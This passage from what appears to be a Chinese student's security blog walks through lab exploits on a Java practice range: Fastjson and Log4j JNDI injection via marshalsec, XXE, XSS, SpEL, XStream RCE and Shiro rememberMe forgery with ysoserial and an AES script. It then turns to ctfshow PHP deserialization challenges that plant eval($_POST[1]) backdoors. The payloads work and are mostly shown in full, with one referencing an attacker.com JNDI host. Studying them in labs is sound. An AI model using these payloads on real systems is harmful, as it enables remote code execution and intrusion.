Feature.SupportNonPublicField）填充 name 和 age。\n\n也就是说我们如果想通过Fastjson进行反序列化漏洞我们就必须开启Feature.SupportNonPublicField然后通过@type进行对类通过反射进行实例化\n我们将payload替换为Windows系统进行命令执行尝试\n不知道为什么，妈的明明感觉payload没问题但就是一直他妈的报错，麻了。\ncom.alibaba.fastjson.JSONException: set property error, outputProperties 错误，通常是因为 Fastjson 的反序列化漏洞防护机制被触发。具体原因是：传入的 JSON 数据包含恶意构造的字段（如 outputProperties），触发了 Fastjson 的防御机制。\n看来直接通过反序列化进行命令执行被未知代码给阻拦了，只能去跟着别人的wp去看看了\n首先就是通过dnslog去测试是否可以成功解析，也就是Fastjson能否使用\n&#123;&quot;name&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;p45ntb.dnslog.cn&quot;&#125;&#125;//java.lang.ClassCastException: java.lang.String cannot be cast to com.alibaba.fastjson.JSONObject\n\n虽然返回我们的ip有问题，后面破案了原来是我们代码获取的是name字段所以我们需要将其通过json的格式放入name中，但是dnslog那边还是有访问记录\n\n\n由于其禁用了我们直接进行命令执行的方法，我们只能通过和log4j一样的方法去实现访问我们设置好的恶意文件\n先准备TouchFile打开计算器\nimport java.lang.Runtime;import java.lang.Process;public class TouchFile &#123;    static &#123;        try &#123;            Runtime rt = Runtime.getRuntime();            // 执行 calc.exe（Windows 计算器）            String[] commands = &#123;&quot;cmd.exe&quot;, &quot;/c&quot;, &quot;calc.exe&quot;&#125;;            Process pc = rt.exec(commands);            pc.waitFor();        &#125; catch (Exception e) &#123;            // 静默处理异常，避免被发现        &#125;    &#125;&#125;\n\n然后将其编译为class文件\njavac TouchFile.java\n\n在通过不知道是什么原理的marshalsec，开启LDAP协议，于是我们可以通过LDAP协议去加载我们的恶意类\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:1999/#TouchFile&quot;Listening on 0.0.0.0:1389Send LDAP reference result for TouchFile redirecting to http://127.0.0.1:1999/TouchFile.class\n\n这里已经有一条加载记录了，剩下的就是去json反序列化\n&#123;    &quot;name&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:1389/TouchFile&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;\n\n\n\n\n@type\n指定 Fastjson 反序列化的目标类为 com.sun.rowset.JdbcRowSetImpl（JDK 内置类）。\n此类实现了 DataSource 接口，可通过 dataSourceName 属性触发 JNDI 查询。\n\n\ndataSourceName\n设置一个恶意的 JNDI 地址（如 idap://127.0.0.1:1389/TouchFile）。\n当 autoCommit 被设置为 true 时，JdbcRowSetImpl 会自动尝试连接该地址，触发 JNDI 查询。\n\n\nautoCommit:true\n强制 JdbcRowSetImpl 初始化时调用 setAutoCommit(true)，内部会执行 connect() 方法，从而发起 JNDI 请求。\n\n\n\n\n\n明明都弹计算器了，但是还是会报错，好傻逼的烟雾弹\n15.XXEXXE(XML外部实体注入、XML External Entity），在应用程序解析XML输入时，当允许引用外部实体时，可以构造恶意内容导致读取任意文件或SSRF、端口探测、DoS拒绝服务攻击、执行系统命令、攻击内部网站等。\n我记得都是通过引用外部实体的时候触发SSRF多一点，就像这样\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY b SYSTEM &quot;file:///etc/hosts&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;b;&lt;/username&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/user&gt;\n\n自然这个基础靶场的payload应该也和这个差不多，也就只是审计一下代码\n    @RequestMapping(value = &quot;/DocumentBuilder/xinclude/vuln&quot;, method = RequestMethod.POST)    public String DocumentBuilderXincludeVuln(HttpServletRequest request) &#123;        try &#123;            String body = WebUtils.getRequestBody(request);//获取到请求头中的body部分，即我们的xml数据            logger.info(body);            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();            dbf.setXIncludeAware(true);   // 支持XInclude            dbf.setNamespaceAware(true);  // 支持XInclude//初始化xml解释器            DocumentBuilder db = dbf.newDocumentBuilder();            StringReader sr = new StringReader(body);//将我们获取的字符串包装成字符输入流            InputSource is = new InputSource(sr);//再将字符输入流包装成InputSource//创建DocumentBuilder并解析XML            Document document = db.parse(is);  // parse xml  未禁用外部实体            //处理解析后的DOM树然后返回响应            NodeList rootNodeList = document.getChildNodes();            response(rootNodeList);            sr.close();            return &quot;DocumentBuilder xinclude xxe vuln code&quot;;        &#125; catch (Exception e) &#123;            logger.error(e.toString());            return EXCEPT;        &#125;    &#125;\n\n这个代码就是获取的xml数据后启动xml解释器然后创建DocumentBuilder对象然后使用InputSource(java xml解析的标准输入包装类)\n我们直接读取文件即可\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE joychou [    &lt;!ENTITY xxe SYSTEM &quot;file:///D:\\flag.txt&quot;&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;\n\n我们还需要将content type改为xml，不然数据读取会出错\n\n\n由于没有返回，所以我们只是在后台读取到了文件内容\n16.XSS又是一个很经典但是CTF不怎么考的漏洞，主要是在用户的输入需要回显到前端界面的时候通过注入前端代码攻击的操作\n    @RequestMapping(&quot;/reflect&quot;)    @ResponseBody    public static String reflect(String xss) &#123;        return xss;    &#125;//这个代码直接把获取的参数返回到了前端界面，直接注入即可\n\n我们直接来看修复代码\n@RequestMapping(&quot;/safe&quot;)@ResponseBodypublic static String safe(String xss) &#123;    return encode(xss);&#125;private static String encode(String origin) &#123;    origin = StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;amp;&quot;);    origin = StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&amp;lt;&quot;);    origin = StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&amp;gt;&quot;);    origin = StringUtils.replace(origin, &quot;\\&quot;&quot;, &quot;&amp;quot;&quot;);    origin = StringUtils.replace(origin, &quot;&#x27;&quot;, &quot;&amp;#x27;&quot;);    origin = StringUtils.replace(origin, &quot;/&quot;, &quot;&amp;#x2F;&quot;);    return origin;&#125;\n\n这个就是对我们输入进行了一个替换，将危险字符替换为html转义字符，也就是保留文本内容但是不进行解析\n\n\n\n原始字符\n转义后的实体\n说明\n\n\n\n&amp;\n&amp;amp\n防止HTML实体截断\n\n\n&lt;\n&amp;lt\n防止标签注入（如&lt;script&gt;）\n\n\n&gt;\n&amp;gt\n防止标签闭合（如&lt;/script&gt;）\n\n\n&quot;\n&amp;quot\n防止属性值逃逸（如onclick=）\n\n\n&#39;\n&amp;#27\n防止单引号属性逃逸\n\n\n/\n&amp;#x2F\n防止自闭合标签（如&lt;img/&gt;）\n\n\n我在复制这个表格的时候发现自动将这些转义后的实体转化为对应字符了，需要自己写上\n\n\n我们查看源代码发现是经过替换了，经过浏览器渲染后又变成文本了\n\n\n好像之前看php代码中highlight_file也会对特殊字符进行转义处理\n还有另外一种方法\n    @RequestMapping(&quot;/stored/store&quot;)    @ResponseBody    public String store(String xss, HttpServletResponse response) &#123;//获取参数xss和http响应        Cookie cookie = new Cookie(&quot;xss&quot;, xss)//将我们的xss参数转化为cookie        response.addCookie(cookie);//将这个cookie作为响应返回，这个cookie会储存到客户端在继续访问时携带        return &quot;Set param into cookie&quot;;    &#125;    @RequestMapping(&quot;/stored/show&quot;)    @ResponseBody    public String show(@CookieValue(&quot;xss&quot;) String xss) &#123;        return xss;//这个读取当前的cookie然后返回到前端界面    &#125;\n\n根据这两个路由，攻击思路就是先通过xss参数写入cookie，然后再访问返回cookie路由就会实现xss注入\n\n\n\n\n17.SpELSpring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。\n    @RequestMapping(&quot;/spel/vuln1&quot;)    public String spel_vuln1(String value) &#123;//启动expression解释器        ExpressionParser parser = new SpelExpressionParser();//调用解释器对参数进行解析然后以字符串的形式返回        return parser.parseExpression(value).getValue().toString();    &#125;\n\n代码很简单，但是重点是多出来一个expression语言，到底有没有必要去学\npayload\nnew java.lang.ProcessBuilder(&quot;calc.exe&quot;).start()\n\n这个就是直接实例化ProcessBuilder进行命令执行，和Groovy感觉没什么区别\n\n\n当然如果输入正常的表达式也会进行解析然后返回计算值的\n18.XStreamRCE@PostMapping(&quot;/xstream&quot;)public String parseXml(HttpServletRequest request) throws Exception &#123;    String xml = WebUtils.getRequestBody(request);    XStream xstream = new XStream(new DomDriver());    xstream.addPermission(AnyTypePermission.ANY); // This will cause all XStream versions to be affected.    xstream.fromXML(xml);    return &quot;xstream&quot;;&#125;\n\n这个代码一看感觉就是简单的XXE漏洞，但是那样直接SSRF就太简单了，我们看名字为XStreamRCE应该是要通过xml进行命令执行\nXStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。Xstream具有以下优点使用方便 - XStream的API提供了一个高层次外观，以简化常用的用例。无需创建映射 - XStream的API提供了默认的映射大部分对象序列化。性能 - XStream快速和低内存占用，适合于大对象图或系统。干净的XML - XStream创建一个干净和紧凑XML结果，这很容易阅读。不需要修改对象 - XStream可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。完整对象图支持 - XStream允许保持在对象模型中遇到的重复引用，并支持循环引用。可自定义的转换策略 - 定制策略可以允许特定类型的定制被表示为XML的注册。安全框架 - XStream提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。错误消息 - 出现异常是由于格式不正确的XML时，XStream抛出一个统一的例外，提供了详细的诊断，以解决这个问题。另一种输出格式 - XStream支持其它的输出格式，如JSON。\n\n也就是说可以将xml文档转换为java对象，然后通过反序列化进行命令执行\n我服了，java反序列化我到现在都没弄明白，现在要通过xml进行反序列化进行命令执行，而且还不能用脚本自动生成pop链，完全看不懂啊\n原理是一下子看不懂的了，先抄一个payload\n&lt;sorted-set&gt;    &lt;string&gt;foo&lt;/string&gt;  &lt;dynamic-proxy&gt; &lt;!-- --&gt;    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;    &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;      &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;        &lt;command&gt;          &lt;string&gt;open&lt;/string&gt;          &lt;string&gt;/System/Applications/Calculator.app&lt;/string&gt;        &lt;/command&gt;      &lt;/target&gt;      &lt;action&gt;start&lt;/action&gt;    &lt;/handler&gt;  &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt;\n\n这个是linux系统中使用的命令执行，在windows系统中没有open，得改为cmd.exe\n&lt;sorted-set&gt;    &lt;string&gt;foo&lt;/string&gt;  &lt;dynamic-proxy&gt; &lt;!-- --&gt;    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;    &lt;handler class=&quot;java.beans.EventHandler&quot;&gt;      &lt;target class=&quot;java.lang.ProcessBuilder&quot;&gt;        &lt;command&gt;          &lt;string&gt;cmd.exe&lt;/string&gt;&lt;string&gt;/c&lt;/string&gt;          &lt;string&gt;calc.exe&lt;/string&gt;        &lt;/command&gt;      &lt;/target&gt;      &lt;action&gt;start&lt;/action&gt;    &lt;/handler&gt;  &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt;\n\n\n\n任重而道远，我知道这些现在我是肯定看不懂的就不浪费时间了\n19.log4j第一次看见这么新的漏洞CVE21年的，这么基础靶场会有怎么难的漏洞，第一次看见几年前的RCE漏洞\n1.JNDIJNDI(Java Naming and Directory Interface) 是 Java 平台提供的一个 命名和目录服务 的标准 API，它允许 Java 应用程序通过统一的接口访问各种命名和目录服务。\nJNDI 架构分为三层：\n\nJNDI API：与 Java 应用程序通信，提供编程接口，隔离应用与数据源\nNaming Manager：命名服务管理器\nJNDI SPI：与具体实现方法（服务）相连接\n\nJNDI 支持的服务有很多，比如 RMI、LDAP、DNS 等服务。JNDI 封装了这些服务，使得可以通过类似的代码访问这些服务（调用容器环境的 Context 的 lookup 方法）\n攻击者可通过构造恶意日志触发LDAP&#x2F;RMI请求，从远程服务器加载并执行任意代码。\n也就是说java会通过JNDI去远程访问我们的服务器然后访问我们实现的方法类，下载并执行这个类\n我们直接来看漏洞代码\n// 不安全的JNDI查询方式（存在注入风险）public class UnsafeJndiLookup &#123;        public static Object unsafeLookup(String name) throws NamingException &#123;        // 1. 不安全的初始化方式 - 没有禁用远程代码加载        Hashtable&lt;String, String&gt; env = new Hashtable&lt;&gt;();        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);                // 2. 允许使用任意LDAP服务器（危险！）        // 攻击者可控制PROVIDER_URL指向恶意服务器        env.put(Context.PROVIDER_URL, &quot;ldap://任意服务器:389&quot;);                  // 3. 没有设置安全属性        // 缺少 com.sun.jndi.ldap.object.trustURLCodebase=false                Context ctx = new InitialContext(env);                // 4. 直接使用未经验证的用户输入进行查询（高危！）        return ctx.lookup(name);  // 如果name包含$&#123;jndi:ldap://攻击者服务器&#125;就会中招    &#125;        public static void main(String[] args) &#123;        try &#123;            // 5. 模拟攻击者输入（实际可能来自HTTP请求参数等）            String maliciousInput = &quot;$&#123;jndi:ldap://attacker.com/恶意类&#125;&quot;;                        // 6. 触发漏洞            Object obj = unsafeLookup(maliciousInput);            System.out.println(&quot;已加载对象: &quot; + obj);                    &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n这个代码先是使用Hashtable创建一个键值对的对象，然后就是塞了一堆配置进去，关于配置懒得看太多\n也就是说流程就是服务器没有对JNDI配置禁止加载远程代码等安全配置，然后又通过JNDI加载了攻击者服务器上面的危险类，然后通过执行这个类然后被RCE\n至于恶意类github上面有这个脚本，我也不知道是怎么做到的\n2.复现过程还是太菜了，花了一两个小时才复现成功，特别是那个开启LDAP服务的时候，下那么多文件我以为要被填满了\n我们首先来观察代码\n@RestControllerpublic class Log4j &#123;    private static final Logger logger = LogManager.getLogger(&quot;Log4j&quot;);    /**     * http://localhost:8080/log4j?token=$&#123;jndi:ldap://127.0.0.1:1389/0iun75&#125;     * Default: error/fatal/off     * Fix: Update log4j to lastet version.     */    @RequestMapping(value = &quot;/log4j&quot;)    public String log4j(String token) &#123;        logger.error(token);        return token;    &#125;    public static void main(String[] args) &#123;        String poc = &quot;$&#123;jndi:ldap://127.0.0.1:1389/Exploid&#125;&quot;;//将jndi协议指向我们的LDAP服务器上的恶意文件        logger.error(poc);//在写入日志的时候会解析jndi协议下载并执行我们的恶意类    &#125;&#125;\n\n现在我们可以知道为什么这个Logger类型是什么了\nLogger 是 Log4j 2 框架中的核心接口，用于记录日志消息。可以将其理解为 Log4j 定义的“日志工具”类型，开发者通过它来输出不同级别的日志（如 info()、error() 等）。\n也就是说我们之前在后台看到的很多日志信息全是通过这个日志工具记录的，于是这个工具的RCE漏洞成了10.0最高级别的漏洞\n第一步:下载marshalsec开启LDAP服务器\nmvn clean package -DskipTests\n\n使用maven进行打包\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:1999/#Exploit&quot;#开启LDAP协议 ip下有我们的恶意类 Exploit.class#默认开启LDAP 1389端口\n\n\n\n第二部:编译恶意类\npublic class Exploit &#123;    static &#123;        try &#123;            // Windows            Runtime.getRuntime().exec(&quot;calc.exe&quot;);            // Linux            // Runtime.getRuntime().exec(&quot;/bin/bash -c &#x27;touch /tmp/pwned&#x27;&quot;);        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n通过这个类打开计算器，本来有脚本直接返回反弹shell的类的，但是好像和我的java版本不匹配，懒得重新装java了\njavac Exploit.java\n\n编译java\n最后:触发漏洞\nhttp://127.0.0.1:8080/log4j?token=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2FExploit%7D\n\n成功弹出计算器\n\n\n\n\n20.Shiro不得不说这个靶场的漏洞是真的多啊，我到现在都还没在网上找到一些完整的wp，太多漏洞见都没见过了\n@Slf4j@RestControllerpublic class Shiro &#123;    byte[] KEYS = java.util.Base64.getDecoder().decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);    private final static String DELETE_ME = &quot;deleteMe&quot;;    AesCipherService acs = new AesCipherService();    @GetMapping(value = &quot;/shiro/deserialize&quot;)    public String shiro_deserialize(HttpServletRequest req, HttpServletResponse res) &#123;        Cookie cookie = getCookie(req, Constants.REMEMBER_ME_COOKIE);//获取到我们的RememberMe cookie        if (null == cookie) &#123;            return &quot;No rememberMe cookie. Right?&quot;;        &#125;        try &#123;            String rememberMe = cookie.getValue();            byte[] b64DecodeRememberMe = java.util.Base64.getDecoder().decode(rememberMe);            byte[] aesDecrypt = acs.decrypt(b64DecodeRememberMe, KEYS).getBytes();//对我们的Cookie的值进行解码            ByteArrayInputStream bytes = new ByteArrayInputStream(aesDecrypt);            ObjectInputStream in = new ObjectInputStream(bytes);            in.readObject();//进行反序列化            in.close();        &#125; catch (Exception e)&#123;            if (CookieUtils.addCookie(res, &quot;rememberMe&quot;, DELETE_ME))&#123;                log.error(e.getMessage());                return &quot;RememberMe cookie decrypt error. Set deleteMe cookie success.&quot;;            &#125;        &#125;        return &quot;Shiro deserialize&quot;;    &#125;&#125;\n\n这个代码实现的是一个Shiro反序列化代码\n在Java安全框架领域，Apache Shiro凭借其简洁易用的特性被广泛应用于身份认证、授权和会话管理。\nApache Shiro 1.2.4及之前版本默认使用硬编码的AES加密密钥，攻击者可利用该密钥构造恶意序列化数据，通过Shiro的RememberMe功能触发远程代码执行（RCE）。即使后续版本移除了默认密钥，若开发者未正确配置动态密钥，仍可能因密钥泄露导致漏洞。\n核心问题\n\nRememberMe功能：Shiro提供“记住我”功能，将用户身份信息序列化后加密存储在Cookie中。\n加密缺陷：使用硬编码的AES密钥（如默认密钥kPH+bIxk5D2deZiIxcaaaA==），攻击者可伪造恶意Cookie。\n危险操作：服务端在解密后直接调用ObjectInputStream.readObject()反序列化数据，导致任意代码执行。\n\n也就是说我们通过获取到AES加密的密钥，然后将我们生成的恶意序列化数据进行加密，Base64编码后放入Cookie中，服务器端获取到Cookie时会将其解密然后进行反序列化，java反序列化直接触发RCE\n这个和普通的反序列化漏洞的区别在于这个不是直接进行反序列化而是需要我们获取AES加密的密钥，主要漏洞在于使用固定的硬编码密钥导致容易被获取\n至于靶场的代码也是简单的复现了一下原理，获取我们的Cookie然后进行解码然后直接反序列化\n现在重点就在于怎么对我们的数据进行加密\n妈的，傻逼ds，给他个源代码叫他给我写加密脚本结果写了好几遍都是错的，浪费了我好长时间，看来是时候转GPT了，好在不知道为什么重新开了一个对话就写对脚本了\n我们先使用脚本生成payload\njava -jar ysoserial.jar CommonsCollections5 &quot;calc.exe&quot; &gt; payload.bin\n\n然后使用加密脚本进行加密\nimport base64from Crypto.Cipher import AESfrom Crypto.Util.Padding import padimport osSHIRO_KEY = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)def encrypt_shiro_payload(payload_file):    # 1. 读取 payload    with open(payload_file, &quot;rb&quot;) as f:        payload = f.read()    # 2. 生成随机 IV（Shiro 默认行为）    iv = os.urandom(16)    cipher = AES.new(SHIRO_KEY, AES.MODE_CBC, iv)    # 3. 加密并拼接 IV + 密文    encrypted = cipher.encrypt(pad(payload, AES.block_size))    encrypted_with_iv = iv + encrypted  # Shiro 的格式：IV在前    # 4. Base64 编码    return base64.b64encode(encrypted_with_iv).decode(&#x27;utf-8&#x27;)# 使用示例if __name__ == &quot;__main__&quot;:    cookie = encrypt_shiro_payload(&quot;payload.bin&quot;)    print(&quot;可用的RememberMe Cookie:&quot;)    print(cookie)\n\n我们然后使用解密脚本看下解密结果是否合理\nimport base64from Crypto.Cipher import AES# Shiro 默认密钥（Base64解码）SHIRO_KEY = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)def shiro_decrypt(remember_me_cookie):    &quot;&quot;&quot;解密 Shiro 的 RememberMe Cookie&quot;&quot;&quot;    # Base64 解码    encrypted_data = base64.b64decode(remember_me_cookie)        # 提取 IV（前16字节）和实际密文    iv = encrypted_data[:16]    ciphertext = encrypted_data[16:]        # AES-CBC 解密    cipher = AES.new(SHIRO_KEY, AES.MODE_CBC, iv)    decrypted = cipher.decrypt(ciphertext)        # 移除 PKCS#5/PKCS#7 填充    pad_length = decrypted[-1]    decrypted = decrypted[:-pad_length]        return decrypted# 示例：输入你的 RememberMe Cookieremember_me_cookie = &quot;cookie&quot;decrypted_data = shiro_decrypt(remember_me_cookie)# 输出前16字节（通常是Java序列化数据的头部）print(&quot;解密后的前16字节（Hex）：&quot;, decrypted_data[:16].hex(&#x27; &#x27;))print(&quot;解密后的前16字节（ASCII）：&quot;, decrypted_data[:16])\n\n将我们的base64编码放入\n\n\n然后放入靶场的Cookie的rememberMe中\n\n\n服了，什么时候我可以自己写加密脚本，可惜我不是学密码的\n21."},{"title":"php反序列化","url":"/2025/02/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"PHP反序列化笔记前言最近有点摆烂啊，心情也不是很好，今天选课羽毛球这么重要的运动竟然没得选，只好去打网球，但网球和羽毛球可是在某种意义上相违背的。还有就是，电子电路和离散数学是真的不想听，数据结构也是的，我都以及好久没写C语言了，学会了又没什么用。总之开始学PHP反序列化了，还有就是某纯我*****\n1.什么是序列化和反序列化序列化是将对象转换为字符串以便存储传输的一种方式。而反序列化恰好就是序列化的逆过程,反序列化会将字符串转换为对象供程序使用。在PHP中序列化和反序列化对应的函数分别为serialize()和unserialize()\n2.什么是反序列化漏洞当我们在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，用于保存对象的值方便之后的传递与使用\n1.反序列函数()1.序列化函数serialize()当我们在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，用于保存对象的值方便之后的传递与使用。\n&lt;?php  class Stu&#123;    public $name = &#x27;aa&#x27;;    public $age = 18;    public function demo()&#123;        echo &quot;你好啊&quot;;    &#125;$stu = new Stu();echo &quot;&lt;pre&gt;&quot;;print_r($stu);//进行序列化$stus = serialize($stu);print_r($stus);&#125; ?&gt;\n\n\n\n2.反序列化函数unserialize()unserialize()可以从序列化后的结果中恢复对象（object）为了使用这个对象，在下列代码中用unserialize重建对象.\n&lt;?php \t//定义一个Stu类\tclass Stu\t&#123;\t\t\t//定义成员属性\t\tpublic $name = &#x27;aa&#x27;;\t\tpublic $age = 19;\t\t//定义成员方法\t\tpublic function demo()\t\t&#123;\t\t\techo &#x27;你吃了吗&#x27;;\t\t&#125;\t&#125;\t//实例化对象\t$stu = new Stu();\t//进行序列化\t$stus = serialize($stu);\tprint_r($stus);\techo &quot;&lt;br&gt;&lt;pre&gt;&quot;;\t//进行反序列化\tprint_r(unserialize($stus)); ?&gt;\n\n\n\n2.ctfshow 题目虽然还有基础知识没有学，但看那些魔术方法根本不知道是干什么用的，果然还是得先写几个题目\n1.255error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            echo &quot;your flag is &quot;.$flag;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125; \n\n这个题目我们看完逻辑后，发现没有任何函数可以使isVip变为true，但我们做的验证全都是在cookie传入的对象中进行的，然后还进行了反序列化，那我们肯定得先从cookie下手\n由于使用的是我们传入的反序列化对象，所以我们可以自己控制传入数据然后进行反序列化即可\n&lt;?phpclass ctfShowUser&#123;    public $isVip=true;&#125; echo urlencode(serialize(new ctfShowUser()));  //payload：/*cookie：user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7Dget：?username=xxxxxx&amp;password=xxxxxx*///由于在反序列化时会出现比如空格等的不可见字符，所以需要我们进行url编码\n\n在 PHP 中，如果反序列化后的对象缺失某些属性，PHP 会使用类定义中的默认值。所以我们只需传入需要更改的数据即可\n2.257error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    private $username=&#x27;xxxxxx&#x27;;    private $password=&#x27;xxxxxx&#x27;;    private $isVip=false;    private $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    $user = unserialize($_COOKIE[&#x27;user&#x27;]);    $user-&gt;login($username,$password);&#125;\n\n这题也是终于看见我们的魔术方法了\n我们根据代码来看，即使login()返回true了也无法对flag有什么影响，所以看其他思路\n我们在backDoor()类中看见了eval()，然后对象又是我们自定义的，我们只要执行就直接rce\n//_construct(),创建对象时调用//虽然我们无法修改类的方法，但我们可以修改类的属性我们改为public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;//把函数改为class backDoor&#123;    private $code=&#x27;eval($_POST[1]);&#x27;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;//最后再进行序列化和编码即可&lt;?phpclass ctfShowUser&#123;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    private $code = &#x27;eval($_POST[1]);&#x27;;    public function getInfo()    &#123;        eval($this-&gt;code);    &#125;&#125;echo urlencode(serialize(new CtfShowUser));\n\n3.258error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    public $username=&#x27;xxxxxx&#x27;;    public $password=&#x27;xxxxxx&#x27;;    public $isVip=false;    public $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    public $user=&#x27;xxxxxx&#x27;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    public $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username=$_GET[&#x27;username&#x27;];$password=$_GET[&#x27;password&#x27;];if(isset($username) &amp;&amp; isset($password))&#123;    if(!preg_match(&#x27;/[oc]:\\d+:/i&#x27;, $_COOKIE[&#x27;user&#x27;]))&#123;        $user = unserialize($_COOKIE[&#x27;user&#x27;]);    &#125;    $user-&gt;login($username,$password);&#125;\n\n这题和上一题差不多，但加了一个正则匹配绕过，我们先来看下未被url编码的序列化对象长什么样\n&lt;?phpclass ctfShowUser&#123;    public $class = &#x27;info&#x27;;    public function __construct()&#123;        $this-&gt;class=new backDoor();    &#125;&#125;class backDoor&#123;    public $code=&#x27;eval($_POST[1]);&#x27;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$a=serialize(new ctfShowUser());$b = str_replace(&quot;O:&quot;, &quot;O:+&quot;, $a);        echo urlencode($b);/*O:11:&quot;ctfShowUser&quot;:1:&#123;s:5:&quot;class&quot;;O:8:&quot;backDoor&quot;:1:&#123;s:14:&quot;backDoorcode&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;*///我们进行一个替换即可\n\n至于为什么是用加号进行替换，这是源于底层的C语言库中在反序列化时可以忽略加号(大概是吧)\n4.259某种意义上有点难，好像还扯到了ssrf，我还是后面再来写这道题吧\n5.260error_reporting(0);highlight_file(__FILE__);include(&#x27;flag.php&#x27;);if(preg_match(&#x27;/ctfshow_i_love_36D/&#x27;,serialize($_GET[&#x27;ctfshow&#x27;])))&#123;    echo $flag;&#125;\n\n这个没什么考的\n只需要记住字符串序列化返回原来的字符串\n?ctfshow=ctfshow_i_love_36D\n\n6.261&lt;?phphighlight_file(__FILE__);class ctfshowvip&#123;    public $username;    public $password;    public $code;    public function __construct($u,$p)&#123;        $this-&gt;username=$u;        $this-&gt;password=$p;    &#125;    public function __wakeup()&#123;        if($this-&gt;username!=&#x27;&#x27; || $this-&gt;password!=&#x27;&#x27;)&#123;            die(&#x27;error&#x27;);        &#125;    &#125;    public function __invoke()&#123;        eval($this-&gt;code);    &#125;    public function __sleep()&#123;        $this-&gt;username=&#x27;&#x27;;        $this-&gt;password=&#x27;&#x27;;    &#125;    public function __unserialize($data)&#123;        $this-&gt;username=$data[&#x27;username&#x27;];        $this-&gt;password=$data[&#x27;password&#x27;];        $this-&gt;code = $this-&gt;username.$this-&gt;password;    &#125;    public function __destruct()&#123;        if($this-&gt;code==0x36d)&#123;            file_put_contents($this-&gt;username, $this-&gt;password);        &#125;    